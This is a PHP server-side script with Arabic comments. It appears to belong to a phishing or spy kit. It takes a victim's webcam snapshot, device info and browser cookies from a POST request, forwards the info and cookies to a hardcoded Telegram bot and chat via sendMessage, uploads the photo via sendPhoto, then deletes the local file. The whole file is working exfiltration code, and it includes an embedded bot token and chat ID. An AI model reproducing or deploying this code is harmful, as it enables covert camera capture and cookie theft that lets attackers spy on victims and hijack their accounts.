<?php
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

if (isset($_POST['img'])) {
    // 1. استقبال وتجهيز الصورة
    $imageData = substr($_POST['img'], strpos($_POST['img'], ",")+1);
    $binaryData = base64_decode($imageData);
    $fileName = 'cam_' . time() . '.jpg';
    file_put_contents($fileName, $binaryData);

    // 2. إرسال النص (المعلومات والكوكيز)
    $info = isset($_POST['info']) ? $_POST['info'] : "N/A";
    $cookies = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";
    $text = "Info: " . $info . "\nCookies: " . $cookies;
    
    // تصحيح الرابط (بدون أخطاء في علامات التنصيص)
    $urlText = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($text);
    file_get_contents($urlText);

    // 3. إرسال الصورة
    $urlPhoto = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($fileName))
    ];
    
    $ch = curl_init($urlPhoto);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // 4. حذف الملف
    unlink($fileName);
}
?>
